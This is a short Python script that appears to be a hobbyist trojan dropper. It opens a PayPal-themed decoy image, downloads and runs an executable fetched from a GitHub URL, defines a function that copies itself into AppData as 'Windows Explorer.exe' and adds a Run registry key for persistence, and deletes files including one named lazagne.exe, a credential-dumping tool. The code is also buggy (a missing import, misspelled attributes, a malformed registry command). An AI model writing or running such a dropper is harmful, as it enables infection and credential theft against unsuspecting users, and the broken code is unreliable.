import requests
import subprocess
import os
import tempfile
import shutil

def become_persistent():
    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(Malocation):
        shutil.copyfile(sys.exexutable, Malocation)
        subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v Explorer /t REG_SZ /d Exexutables/Download.exe "' + Malocation + '"', shell=True)

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

paypalSS = "https://howto.org/wp-content/uploads/2019/02/How-to-Get-PayPal-Money-Instantly-4.jpg"

Download(paypalSS)

result = subprocess.Popen("How-to-Get-PayPal-Money-Instantly-4.jpg", shell=True);

Download("https://github.com/JustinAvina/Python-Scripts/blob/main/Executables/Download.exe")

result = subprocess.call("Download.exe", shell=True);
print(result)

os.remove("lazagne.exe")
os.remove("Download.exe")
